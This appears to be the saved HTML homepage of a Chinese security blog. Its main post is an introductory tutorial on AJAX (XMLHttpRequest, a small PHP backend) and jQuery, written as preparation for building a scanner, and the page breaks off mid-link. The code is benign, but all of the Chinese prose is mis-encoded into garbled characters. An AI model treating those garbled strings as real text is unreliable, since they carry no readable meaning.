<!DOCTYPE html>
<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
    <meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="theme-color" content="#222">


    <meta http-equiv="Cache-Control" content="no-transform">
    <meta http-equiv="Cache-Control" content="no-siteapp">


    <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">


    <link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet"
          type="text/css">

    <link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


    <link rel="icon" type="image/png" sizes="32x32" href="/images/ava.jpg?v=5.1.4">


    <link rel="icon" type="image/png" sizes="16x16" href="/images/ava.jpg?v=5.1.4">


    <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">


    <meta name="keywords" content="Hexo, NexT">


    <meta name="keywords" content="hackã€share">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Sec-Communication">
    <meta property="og:url" content="http://yoursite.com/index.html">
    <meta property="og:site_name" content="Sec-Communication">
    <meta property="og:locale" content="zh-Hans">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Sec-Communication">


    <script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };

    </script>


    <link rel="canonical" href="http://yoursite.com/">


    <title>Sec-Communication</title>


</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">


<div class="container sidebar-position-left
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
        <div class="header-inner">
            <div class="site-brand-wrapper">
                <div class="site-meta ">


                    <div class="custom-logo-site-title">
                        <a href="/" class="brand" rel="start">
                            <span class="logo-line-before"><i></i></span>
                            <span class="site-title">Sec-Communication</span>
                            <span class="logo-line-after"><i></i></span>
                        </a>
                    </div>

                    <p class="site-subtitle"></p>

                </div>

                <div class="site-nav-toggle">
                    <button>
                        <span class="btn-bar"></span>
                        <span class="btn-bar"></span>
                        <span class="btn-bar"></span>
                    </button>
                </div>
            </div>

            <nav class="site-nav">


                <ul id="menu" class="menu">


                    <li class="menu-item menu-item-home">
                        <a href="/" rel="section">

                            <i class="menu-item-icon fa fa-fw fa-home"></i> <br>

                            é¦–é¡µ
                        </a>
                    </li>


                    <li class="menu-item menu-item-about">
                        <a href="/about/" rel="section">

                            <i class="menu-item-icon fa fa-fw fa-user"></i> <br>

                            å…³äº
                        </a>
                    </li>


                    <li class="menu-item menu-item-tags">
                        <a href="/tags/" rel="section">

                            <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>

                            æ ‡ç­¾
                        </a>
                    </li>


                    <li class="menu-item menu-item-categories">
                        <a href="/categories/" rel="section">

                            <i class="menu-item-icon fa fa-fw fa-th"></i> <br>

                            åˆ†ç±»
                        </a>
                    </li>


                    <li class="menu-item menu-item-archives">
                        <a href="/archives/" rel="section">

                            <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>

                            å½’æ¡£
                        </a>
                    </li>


                    <li class="menu-item menu-item-search">

                        <a href="javascript:;" class="popup-trigger">


                            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>

                            æœç´¢
                        </a>
                    </li>

                </ul>


                <div class="site-search">

                    <div class="popup search-popup local-search-popup">
                        <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
                            <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
                            <div class="local-search-input-wrapper">
                                <input autocomplete="off" placeholder="æœç´¢..." spellcheck="false"
                                       type="text" id="local-search-input">
                            </div>
                        </div>
                        <div id="local-search-result"></div>
                    </div>


                </div>

            </nav>


        </div>
    </header>

    <main id="main" class="main">
        <div class="main-inner">
            <div class="content-wrap">
                <div id="content" class="content">

                    <section id="posts" class="posts-expand">


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2099/06/16/index/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2099/06/16/index/"
                                           itemprop="url">hack for sec!</a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2099-06-16T00:00:00+08:00">
                2099-06-16
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="å°ğŸ·ä½©å¥‡"><a href="#å°ğŸ·ä½©å¥‡" class="headerlink"
                                                      title="å°ğŸ·ä½©å¥‡"></a>å°ğŸ·ä½©å¥‡</h1>
                                    <p>å°†è‡ªå·±æ‰€å­¦åŠå†ç¨‹è®°å½•ä¸‹æ¥ï¼Œå¦‚æœ‰é”™è¯¯è¯·å¸ˆå‚…ä»¬ä¸åèµæ•™ã€‚</p>
                                    <p>Qq: 93426378</p>
                                    <p>å®‰å…¨å®¢ï¼šå°çŒªä½©å¥‡</p>
                                    <p>å…ˆçŸ¥ç¤¾åŒºï¼šå°çŒªä½©çª</p>
                                    <p>åˆšå…¥é—¨çš„èœğŸ”ï¼Œå¸ˆå‚…å¤šå¤šæç‚¹ï¼Œä¹Ÿå¸Œæœ›æ‰€è®°å½•èƒ½å¯¹å¸ˆå‚…ä»¬æœ‰æ‰€å¸®åŠ©ã€‚</p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/09/26/å‰ç«¯åŸºæœ¬å­¦ä¹ /">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/09/26/å‰ç«¯åŸºæœ¬å­¦ä¹ /"
                                           itemprop="url">å‰ç«¯åŸºæœ¬å­¦ä¹ (æ‰«æå™¨å¼€å‘å‡†å¤‡)</a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-09-26T00:00:00+08:00">
                2019-09-26
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <h1 id="ajax"><a href="#ajax" class="headerlink"
                                                     title="ajax"></a>ajax</h1>
                                    <h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹
                                    </h2>
                                    <p>AJAX æ˜¯ä¸€ç§åœ¨æ— éœ€é‡æ–°åŠ è½½æ•´ä¸ªç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿæ›´æ–°éƒ¨åˆ†ç½‘é¡µçš„æŠ€æœ¯ã€‚</p>
                                    <p>AJAX = å¼‚æ­¥ JavaScript å’Œ XMLã€‚</p>
                                    <p>AJAX æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºå¿«é€ŸåŠ¨æ€ç½‘é¡µçš„æŠ€æœ¯ã€‚</p>
                                    <p>é€šè¿‡åœ¨åå°ä¸æœåŠ¡å™¨è¿›è¡Œå°‘é‡æ•°æ®äº¤æ¢ï¼ŒAJAX
                                        å¯ä»¥ä½¿ç½‘é¡µå®ç°å¼‚æ­¥æ›´æ–°ã€‚è¿™æ„å‘³ç€å¯ä»¥åœ¨ä¸é‡æ–°åŠ è½½æ•´ä¸ªç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯¹ç½‘é¡µçš„æŸéƒ¨åˆ†è¿›è¡Œæ›´æ–°ã€‚</p>
                                    <p>ä¼ ç»Ÿçš„ç½‘é¡µï¼ˆä¸ä½¿ç”¨ AJAXï¼‰å¦‚æœéœ€è¦æ›´æ–°å†…å®¹ï¼Œå¿…éœ€é‡è½½æ•´ä¸ªç½‘é¡µé¢</p>
                                    <h2 id="Ajax-xmlhttprequest"><a href="#Ajax-xmlhttprequest"
                                                                    class="headerlink"
                                                                    title="Ajax-xmlhttprequest"></a>Ajax-xmlhttprequest
                                    </h2>
                                    <p>XMLHttpRequest æ˜¯ AJAX çš„åŸºç¡€ï¼ŒXMLHttpRequest
                                        ç”¨äºåœ¨åå°ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®ã€‚è¿™æ„å‘³ç€å¯ä»¥åœ¨ä¸é‡æ–°åŠ è½½æ•´ä¸ªç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯¹ç½‘é¡µçš„æŸéƒ¨åˆ†è¿›è¡Œæ›´æ–°ã€‚</p>
                                    <p>æ— éœ€åˆ·æ–°é¡µé¢æ¥è¯·æ±‚æœåŠ¡å™¨æ•°æ®å†…å®¹ã€‚å¦‚éœ€å°†è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ XMLHttpRequest å¯¹è±¡çš„ open() å’Œ
                                        send() æ–¹æ³•ï¼š</p>
                                    <p>sendä»…ç”¨äºpostè¯·æ±‚ã€‚</p>
                                    <p>ä»£ç ç®€å•å°è¯•ï¼Œæ ¸å¿ƒä»£ç </p>
                                    <pre><code>function loadXMLDoc()
{

//åˆ›å»ºxmlhttpè¯·æ±‚
var xmlhttp;
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
    {
    document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;
    }
  }
xmlhttp.open(&quot;GET&quot;,&quot;/2.php&quot;,true);
xmlhttp.send();
}</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1569576970.jpg" alt>
                                    </p>
                                    <p>ç‚¹å‡»è¯·æ±‚æ•°æ®å³å¯åŠ è½½å‡º2.phpé¡µé¢çš„å†…å®¹ï¼Œå¹¶æ’å…¥åˆ°æ ‡ç­¾idä¸ºmyDivä¸­</p>
                                    <p>å¦‚æœè¦æ”¹ä¸ºpostè¯·æ±‚åªéœ€è¦å°†getæ”¹ä¸ºpost</p>
                                    <pre><code>xmlhttp.open(&quot;POST&quot;,&quot;demo_post.asp&quot;,true);
xmlhttp.send();</code></pre>
                                    <p>å¦‚æœè¦æ·»åŠ httpå¤´ï¼Œé‚£ä¹ˆéœ€è¦setRequestHeader()æ¥æ·»åŠ </p>
                                    <pre><code>xmlhttp.open(&quot;POST&quot;,&quot;ajax_test.asp&quot;,true);
xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
xmlhttp.send(&quot;fname=Bill&amp;lname=Gates&quot;);</code></pre>
                                    <p>reponseæ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ•°æ®æœ‰ä¸¤ç§æ ¼å¼ï¼Œ</p>
                                    <pre><code>responseText    è·å¾—å­—ç¬¦ä¸²å½¢å¼çš„å“åº”æ•°æ®ã€‚
responseXML    è·å¾— XML å½¢å¼çš„å“åº”æ•°æ®ã€‚</code></pre>
                                    <p>ä»¥ä¸Šæ ¸å¿ƒä»£ç ä¸­çš„onreadystatechange </p>
                                    <p>æ¯å½“ readyState æ”¹å˜æ—¶ï¼Œå°±ä¼šè§¦å‘ onreadystatechange
                                        äº‹ä»¶ã€‚readystateæœ‰å››ç§å±æ€§</p>
                                    <pre><code>0: è¯·æ±‚æœªåˆå§‹åŒ–
1: æœåŠ¡å™¨è¿æ¥å·²å»ºç«‹
2: è¯·æ±‚å·²æ¥æ”¶
3: è¯·æ±‚å¤„ç†ä¸­
4: è¯·æ±‚å·²å®Œæˆï¼Œä¸”å“åº”å·²å°±ç»ª</code></pre>
                                    <p>statusæœ‰ä¸¤ç§</p>
                                    <pre><code>200: &quot;OK&quot;

404: æœªæ‰¾åˆ°é¡µé¢</code></pre>
                                    <p>åº”ç”¨ä»£ç </p>
                                    <pre><code>if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</code></pre>
                                    <p>å½“readystateç­‰äºå››å¹¶ä¸”statusä¸º200çš„æ—¶å€™è¡¨ç¤ºå·²ç»å°±ç»ªã€‚</p>
                                    <h2 id="Ajax-å¼‚æ­¥"><a href="#Ajax-å¼‚æ­¥" class="headerlink"
                                                        title="Ajax-å¼‚æ­¥"></a>Ajax-å¼‚æ­¥</h2>
                                    <p>AJAX æŒ‡çš„æ˜¯å¼‚æ­¥ JavaScript å’Œ XMLï¼ˆAsynchronous JavaScript and
                                        XMLï¼‰ã€‚</p>
                                    <p>
                                        ç†è§£ä¸ºå½“å‘é€ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨éœ€è¦è¿è¡Œä¸€æ®µæ—¶é—´è¿”å›æ•°æ®ï¼Œé€šè¿‡å¼‚æ­¥è¯·æ±‚ï¼Œå…ˆæ‰§è¡Œæ¥ä¸‹æ¥çš„jsä»£ç ï¼Œè€Œä¸æ˜¯ç­‰æœåŠ¡å™¨æ‰§è¡Œå®Œä¹‹åæ‰æ‰§è¡Œåé¢çš„ä»£ç ï¼Œå³ä¸åŒæ­¥ã€‚</p>
                                    <p>é€šè¿‡ AJAXï¼ŒJavaScript æ— éœ€ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼Œè€Œæ˜¯ï¼š</p>
                                    <pre><code>åœ¨ç­‰å¾…æœåŠ¡å™¨å“åº”æ—¶æ‰§è¡Œå…¶ä»–è„šæœ¬
å½“å“åº”å°±ç»ªåå¯¹å“åº”è¿›è¡Œå¤„ç†</code></pre>
                                    <p>XMLHttpRequest å¯¹è±¡å¦‚æœè¦ç”¨äº AJAX çš„è¯ï¼Œå…¶ open() æ–¹æ³•çš„ async å‚æ•°å¿…é¡»è®¾ç½®ä¸º
                                        trueï¼š</p>
                                    <pre><code>xmlhttp.open(&quot;GET&quot;,&quot;ajax_test.asp&quot;,true);</code></pre>
                                    <h2 id="ajax-php-aspåŠ¨æ€å®ä¾‹æŸ¥è¯¢"><a href="#ajax-php-aspåŠ¨æ€å®ä¾‹æŸ¥è¯¢"
                                                                   class="headerlink"
                                                                   title="ajax-php/aspåŠ¨æ€å®ä¾‹æŸ¥è¯¢"></a>ajax-php/aspåŠ¨æ€å®ä¾‹æŸ¥è¯¢
                                    </h2>
                                    <p>ä»£ç å®ä¾‹</p>
                                    <pre><code>    &lt;html&gt;
&lt;head&gt;
&lt;title&gt;æµ‹è¯•&lt;/title&gt;
&lt;link href=&quot;/static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;

&lt;/head&gt;
&lt;body&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function showHint(str)
{
var xmlhttp;
if (str.length==0)
  {
  document.getElementById(&quot;txtHint&quot;).innerHTML=&quot;&quot;;
  return;
  }
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
    {
    document.getElementById(&quot;txtHint&quot;).innerHTML=xmlhttp.responseText;
    }
  }
xmlhttp.open(&quot;GET&quot;,&quot;/1.php?test=&quot;+str,true);
xmlhttp.send();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;h3&gt;è¯·è¾“å…¥æˆè¯­å¼€å¤´æ•°å­—&lt;/h3&gt;
&lt;form action=&quot;&quot;&gt;
è¾“å…¥ï¼š&lt;input type=&quot;text&quot; id=&quot;txt1&quot; onkeyup=&quot;showHint(this.value)&quot; /&gt;
&lt;/form&gt;
&lt;p&gt;ç»“æœï¼š&lt;span id=&quot;txtHint&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1569824477.jpg" alt>
                                    </p>
                                    <p>åç«¯ 1.phpä»£ç </p>
                                    <pre><code>&lt;?php

if($_GET[&apos;test&apos;]==&apos;1&apos;)
{
    echo &quot;ä¸€å¿ƒä¸€æ„&quot;;
}
else if($_GET[&apos;test&apos;]==&apos;2&apos;)
{
    echo &quot;äºŒé¾™æˆç &quot;;
}
?&gt;</code></pre>
                                    <p>è¾“å…¥1å›æ˜¾ ä¸€å¿ƒä¸€æ„ï¼Œè¾“å…¥2å›æ˜¾äºŒé¾™æˆç </p>
                                    <p>å¦‚æœè¾“å…¥æ¡†ä¸ºç©º (str.length==0)ï¼Œåˆ™è¯¥å‡½æ•°æ¸…ç©º txtHint
                                        å ä½ç¬¦çš„å†…å®¹ï¼Œå¹¶é€€å‡ºå‡½æ•°ã€‚å¦åˆ™æ‰§è¡Œä¸‹é¢çš„å‡½æ•°ã€‚</p>
                                    <p>select æŸ¥è¯¢ å¯ç”¨ onchange æ¥è°ƒç”¨è¿”å›ï¼Œselectç‚¹å‡»é€‰æ‹©å³å¯è¿”å›ç»™è‡ªå®šå‡½æ•°æ¥æŸ¥è¯¢è¿”å›ç»“æœã€‚</p>
                                    <pre><code>&lt;select name=&quot;customers&quot; onchange=&quot;showCustomer(this.value)&quot; style=&quot;font-family:Verdana, Arial, Helvetica, sans-serif;&quot;&gt;</code></pre>
                                    <h1 id="JQuery"><a href="#JQuery" class="headerlink"
                                                       title="JQuery"></a>JQuery</h1>
                                    <h2 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹
                                    </h2>
                                    <p>
                                        jQueryæ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€æ´çš„JavaScriptæ¡†æ¶ï¼Œæ˜¯ç»§Prototypeä¹‹ååˆä¸€ä¸ªä¼˜ç§€çš„JavaScriptä»£ç åº“ï¼ˆæˆ–JavaScriptæ¡†æ¶ï¼‰ã€‚jQueryè®¾è®¡çš„å®—æ—¨æ˜¯â€œwrite
                                        Lessï¼ŒDo
                                        Moreâ€ï¼Œå³å€¡å¯¼å†™æ›´å°‘çš„ä»£ç ï¼Œåšæ›´å¤šçš„äº‹æƒ…ã€‚å®ƒå°è£…JavaScriptå¸¸ç”¨çš„åŠŸèƒ½ä»£ç ï¼Œæä¾›ä¸€ç§ç®€ä¾¿çš„JavaScriptè®¾è®¡æ¨¡å¼ï¼Œä¼˜åŒ–HTMLæ–‡æ¡£æ“ä½œã€äº‹ä»¶å¤„ç†ã€åŠ¨ç”»è®¾è®¡å’ŒAjaxäº¤äº’ã€‚</p>
                                    <p>jQuery ä¸­æ‰€æœ‰é€‰æ‹©å™¨éƒ½ä»¥ç¾å…ƒç¬¦å·å¼€å¤´ï¼š$()ã€‚</p>
                                    <p>åœ¨htmlä¸­ä½¿ç”¨jqueryä¹‹å‰é¦–å…ˆå¼•å…¥jqueryåº“ï¼Œå¯ä»¥ä¸‹è½½jsåº“åˆ°æœ¬åœ°ï¼Œå¼•ç”¨</p>
                                    <pre><code>&lt;script src=&quot;jquery-1.10.2.min.js&quot;&gt;&lt;/script&gt;</code></pre>
                                    <p>æˆ–è€…å¼•ç”¨è°·æ­Œç™¾åº¦ç­‰jqueryçš„jsæ–‡ä»¶ã€‚</p>
                                    <pre><code>&lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;&gt;</code></pre>
                                    <h2 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•
                                    </h2>
                                    <pre><code>$(selector).action()
ç¾å…ƒç¬¦å·å®šä¹‰ jQuery
é€‰æ‹©ç¬¦ï¼ˆselectorï¼‰&quot;æŸ¥è¯¢&quot;å’Œ&quot;æŸ¥æ‰¾&quot; HTML å…ƒç´ 
jQuery çš„ action() æ‰§è¡Œå¯¹å…ƒç´ çš„æ“ä½œ
å®ä¾‹:

$(this).hide() - éšè—å½“å‰å…ƒç´ 

$(&quot;p&quot;).hide() - éšè—æ‰€æœ‰ &lt;p&gt; å…ƒç´ 

$(&quot;p.test&quot;).hide() - éšè—æ‰€æœ‰ class=&quot;test&quot; çš„ &lt;p&gt; å…ƒç´ 

$(&quot;#test&quot;).hide() - éšè—æ‰€æœ‰ id=&quot;test&quot; çš„å…ƒç´ </code></pre>
                                    <p>æµ‹è¯•ä»£ç </p>
                                    <pre><code>&lt;script&gt;
$(&quot;p&quot;).hide();
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p&gt;å¦‚æœä½ ç‚¹æˆ‘ï¼Œæˆ‘å°±ä¼šæ¶ˆå¤±ã€‚&lt;/p&gt;
&lt;p&gt;ç»§ç»­ç‚¹æˆ‘!&lt;/p&gt;
&lt;p&gt;æ¥ç€ç‚¹æˆ‘!&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
                                    <p>ä»¥ä¸Šä»£ç å¹¶ä¸ä¼šéšè—pæ ‡ç­¾é‡Œçš„ä»£ç ã€‚å› ä¸ºåœ¨å®é™…è¯­æ³•ä¸­éƒ½æ˜¯å¦‚ä¸‹</p>
                                    <pre><code>$(document).ready(function(){

   // jQuery ä»£ç ...

});</code></pre>
                                    <p>è¿™æ˜¯ä¸ºäº†é˜²æ­¢æ–‡æ¡£åœ¨å®Œå…¨åŠ è½½ï¼ˆå°±ç»ªï¼‰ä¹‹å‰è¿è¡Œ jQuery ä»£ç ï¼Œå³åœ¨ DOM åŠ è½½å®Œæˆåæ‰å¯ä»¥å¯¹ DOM
                                        è¿›è¡Œæ“ä½œã€‚</p>
                                    <p>å¦‚æœåœ¨æ–‡æ¡£æ²¡æœ‰å®Œå…¨åŠ è½½ä¹‹å‰å°±è¿è¡Œå‡½æ•°ï¼Œæ“ä½œå¯èƒ½å¤±è´¥ã€‚</p>
                                    <p>ç®€æ´å†™æ³•å’Œä¸Šé¢çš„å†™æ³•æ•ˆæœä¸€æ ·</p>
                                    <pre><code>$(function(){

   // å¼€å§‹å†™ jQuery ä»£ç ...

});</code></pre>
                                    <p>æˆåŠŸæ‰§è¡Œéšè—pæ ‡ç­¾ä»£ç ï¼Œå¦‚ä¸‹ã€‚</p>
                                    <pre><code>$(function(){
   $(&quot;p&quot;).hide();
});

&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;p&gt;å¦‚æœä½ ç‚¹æˆ‘ï¼Œæˆ‘å°±ä¼šæ¶ˆå¤±ã€‚&lt;/p&gt;
&lt;p&gt;ç»§ç»­ç‚¹æˆ‘!&lt;/p&gt;
&lt;p&gt;æ¥ç€ç‚¹æˆ‘!&lt;/p&gt;</code></pre>
                                    <h2 id="é€‰æ‹©è¯­æ³•"><a href="#é€‰æ‹©è¯­æ³•" class="headerlink"
                                                     title="é€‰æ‹©è¯­æ³•"></a>é€‰æ‹©è¯­æ³•</h2>
                                    <p>æ¥ä¸‹æ¥ä¸€ç»„åŠ¨æ€æ‰§è¡Œçš„ä»£ç ï¼Œéœ€è¦ç‚¹å‡»éšè—ï¼Œå¯¹idçš„é€‰å–è¯­æ³•</p>
                                    <p>$(â€œ#testâ€)ä¹Ÿå°±æ˜¯å¤šåŠ ä¸€ä¸ª#</p>
                                    <pre><code>$(document).ready(function(){
  $(&quot;button&quot;).click(function(){
    $(&quot;#test&quot;).hide();
  });
});</code></pre>
                                    <p>å¯¹buttonæ ‡ç­¾æ‰§è¡Œclickæ–¹æ³•ï¼Œç‚¹å‡»buttonæ ‡ç­¾ï¼Œæ‰§è¡Œå‡½æ•°idä¸ºtestçš„éšè—ã€‚</p>
                                    <p>
                                        å¯¹classçš„é€‰æ‹©ï¼Œè¯­æ³•ä¸º$(â€œ.testâ€)ï¼Œä¹Ÿå°±æ˜¯å¤šåŠ ä¸€ä¸ªç‚¹ä¸ºé€‰æ‹©classçš„æ ‡ç­¾ã€‚å°†classä¸ºtestçš„æ ‡ç­¾éšè—ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1569833143.jpg" alt>
                                    </p>
                                    <h2 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶
                                    </h2>
                                    <p>clickç‚¹å‡»å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„äº‹ä»¶ï¼Œ</p>
                                    <pre><code>$(&quot;p&quot;).click();</code></pre>
                                    <p>jqueryäº‹ä»¶</p>
                                    <pre><code>https://www.runoob.com/jquery/jquery-events.html</code></pre>
                                    <h2 id="jquery-ajax"><a href="#jquery-ajax" class="headerlink"
                                                            title="jquery-ajax"></a>jquery-ajax</h2>
                                    <p>å®Œæ•´ä»£ç å¼•ç”¨</p>
                                    <pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;jquery-ajax&lt;/title&gt;
&lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;&gt;
&lt;/script&gt;
&lt;script&gt;
$(document).ready(function(){
    $(&quot;button&quot;).click(function(){
        $(&quot;#div1&quot;).load(&quot;/1.php&quot;);
    });
});
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;div id=&quot;div1&quot;&gt;&lt;h2&gt;ä½¿ç”¨ jQuery AJAX ä¿®æ”¹æ–‡æœ¬å†…å®¹&lt;/h2&gt;&lt;/div&gt;
&lt;button&gt;è·å–å¤–éƒ¨å†…å®¹&lt;/button&gt;

&lt;/body&gt;
&lt;/html&gt;</code></pre>
                                    <p>ç‚¹å‡»æŒ‰é’®è§¦å‘load()äº‹ä»¶åŠ è½½å¤–éƒ¨æ–‡ä»¶ã€‚</p>
                                    <p>åœ¨loadäº‹ä»¶åå¢åŠ functionå‡½æ•°ï¼Œå¦‚æœæˆåŠŸåŠ è½½åˆ™è¿”å›å¼¹çª—åŠ è½½æˆåŠŸã€‚</p>
                                    <pre><code>$(&quot;button&quot;).click(function(){
  $(&quot;#div1&quot;).load(&quot;demo_test.txt&quot;,function(responseTxt,statusTxt,xhr){
    if(statusTxt==&quot;success&quot;)
      alert(&quot;å¤–éƒ¨å†…å®¹åŠ è½½æˆåŠŸ!&quot;);
    if(statusTxt==&quot;error&quot;)
      alert(&quot;Error: &quot;+xhr.status+&quot;: &quot;+xhr.statusText);
  });
});</code></pre>
                                    <p>åŠ è½½å¤–éƒ¨æ–‡ä»¶è¿˜å¯ç”¨getæ–¹æ³• postæ–¹æ³•ã€‚</p>
                                    <p>$.get(URL,callback);</p>
                                    <pre><code>$(&quot;button&quot;).click(function(){
  $.get(&quot;demo_test.php&quot;,function(data,status){
    alert(&quot;æ•°æ®: &quot; + data + &quot;\nçŠ¶æ€: &quot; + status);
  });
});</code></pre>
                                    <p>$.post(URL,data,callback);</p>
                                    <pre><code>$(document).ready(function(){
    $(&quot;button&quot;).click(function(){
        $.post(&quot;/try/ajax/demo_test_post.php&quot;,{
            name:&quot;èœé¸Ÿæ•™ç¨‹&quot;,
            url:&quot;http://www.runoob.com&quot;
        },
        function(data,status){
            alert(&quot;æ•°æ®: \n&quot; + data + &quot;\nçŠ¶æ€: &quot; + status);
        });
    });
});</code></pre>
                                    <p>å‚è€ƒå­¦ä¹ ï¼š<a href="https://www.w3school.com.cn" target="_blank"
                                               rel="noopener">https://www.w3school.com.cn</a><br>å‚è€ƒå­¦ä¹ ï¼š<a
                                            href="https://www.runoob.com/" target="_blank"
